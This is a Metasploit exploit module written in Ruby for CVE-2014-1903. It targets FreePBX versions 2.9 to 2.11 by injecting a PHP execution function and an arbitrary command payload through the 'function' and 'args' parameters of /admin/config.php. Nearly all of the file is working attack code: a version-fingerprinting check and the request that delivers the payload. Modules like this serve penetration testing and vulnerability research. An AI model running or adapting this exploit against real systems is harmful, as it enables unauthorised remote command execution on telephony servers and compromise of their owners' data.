##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "FreePBX config.php Remote Code Execution",
      'Description'    => %q{
        This module exploits a vulnerability found in FreePBX version 2.9, 2.10, and 2.11.
        It's possible to inject arbitrary PHP functions and commands in the "/admin/config.php"
        parameters "function" and "args".
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'i-Hmx', # Vulnerability discovery
          '0x00string', # PoC
          'xistence <xistence[at]0x90.nl>' # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2014-1903'],
          ['OSVDB', '103240'],
          ['EDB', '32214'],
          ['URL', 'http://issues.freepbx.org/browse/FREEPBX-7123']
        ],
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          ['FreePBX', {}]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Mar 21 2014",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, 'The base path to the FreePBX installation', '/'])
        ], self.class)

      register_advanced_options(
        [
          OptString.new('PHPFUNC', [true, 'The PHP execution function to use', 'passthru'])
        ], self.class)
  end


  def check
    vprint_status("#{peer} - Trying to detect installed version")

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, "admin", "CHANGES")
    })

    if res and res.code == 200 and res.body =~ /^(.*)$/
      version = $1
    else
      return Exploit::CheckCode::Unknown
    end

    vprint_status("#{peer} - Version #{version} detected")

    if version =~ /2\.(9|10|11)\.0/
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    rand_data = rand_text_alpha_lower(rand(10) + 5)

    print_status("#{peer} - Sending payload")
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, "admin", "config.php"),
      'vars_get' => {
        "display" => rand_data,
        "handler" => "api",
        "function" => datastore['PHPFUNC'],
        "args" => payload.encoded
      }
    })

    # If we don't get a 200 when we request our malicious payload, we suspect
    # we don't have a shell, either.
    if res and res.code != 200
      print_error("#{peer} - Unexpected response, exploit probably failed!")
    end

  end

end
